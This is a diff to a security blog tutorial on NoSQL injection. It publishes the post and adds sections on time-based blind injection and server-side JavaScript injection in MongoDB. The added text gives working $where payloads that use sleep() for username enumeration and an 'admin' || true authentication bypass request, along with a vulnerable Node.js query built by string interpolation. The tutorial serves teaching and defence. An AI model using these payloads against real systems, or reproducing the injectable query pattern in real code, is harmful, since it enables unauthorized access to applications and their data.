@@ -1,7 +1,7 @@
 ---
 title: "NoSQL Injection Attacks"
-date: 2025-02-17
-draft: true
+date: 2025-02-18
+draft: false
 description: "Introduction into NoSQL Injection Attacks"
 ---
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -101,3 +101,83 @@ search[$regex]=^Sec.* ✔️
 …
 search[$regex]=^SecretProduct$
 ```
+
+The `$` indicates the end of a string, verifying if the entire word is correct.
+
+#### Time-Based
+In a <span class="text-primary-400">Time-Based Blind Injection</span>, the attacker sends queries that cause the server to <span class="text-primary-400">delay its response when certain conditions are true</span>. By measuring these response times, the attacker can infer information about the database.
+
+<b class="text-primary-400">Example Scenario</b>: Assume a NoSQL Injection vulnerability in the username parameter:
+
+```HTTP
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{
+    "username": {
+       "$where": "function() { if(this.username == 'admin') { sleep(5000); } return true; }"
+    },
+    "password": "randompassword"
+}
+```
+
+<b class="text-primary-400">Explanation</b>: JavaScript Function -- The `this` keyword refers to the current document being evaluated in the collection.
+
+```JS
+if(this.username == 'admin') { sleep(5000); }
+```
+
+<b class="text-primary-400">Behavior</b>: If `this.username == 'admin'` evaluates to true, the function calls `sleep(5000)` to delay the response by 5 seconds, indicating that the username exists. Otherwise, the response time remains normal.
+
+An attacker can enumerate usernames or other fields character by character using a similar method:
+
+```Json
+{
+    "username": {
+        "$where": "function() { if (this.username[0] == 'a') { sleep(5000); } return true; }"
+    },
+    "password": "irrelevant"
+}
+```
+
+By systematically testing each character position, the attacker can reconstruct sensitive information.
+
+### Server-Side JavaScript Injection (<span class="text-primary-400">SSJI</span>)
+MongoDB allows the use of JavaScript expressions in queries via the `$where` operator. If not handled securely, this feature can be exploited.
+
+<b class="text-primary-400">Example Scenario</b>: Consider the following MongoDB query in a Node.js application:
+
+```JS
+collection.findOne({
+  $where: `this.username == '${username}' && this.password == '${password}'`
+}, function(err, user) {
+    if (user) {
+        res.send('Logged in as ' + user.username);
+    } else {
+        res.send('Authentication failed');
+    }
+});
+```
+
+An attacker can manipulate the `username` field to inject malicious code:
+
+```HTTP
+POST /login HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' || true //&password=anything
+```
+
+Resulting Query:
+
+```JS
+db.users.findOne({
+    $where: "this.username == 'admin' || true // ' && this.password == 'anything'"
+});
+```
+
+Effect: The condition `this.username == 'admin' || true` always evaluates to true, allowing the attacker to bypass authentication.
+
+<b class="text-primary-400">Further Exploitation</b>: Attackers can use injections like `" || ""=="` or `" || true || ""=="` to evaluate the entire query to true. They can also enumerate fields using functions like `match($regex)` and the character-by-character approach mentioned earlier.
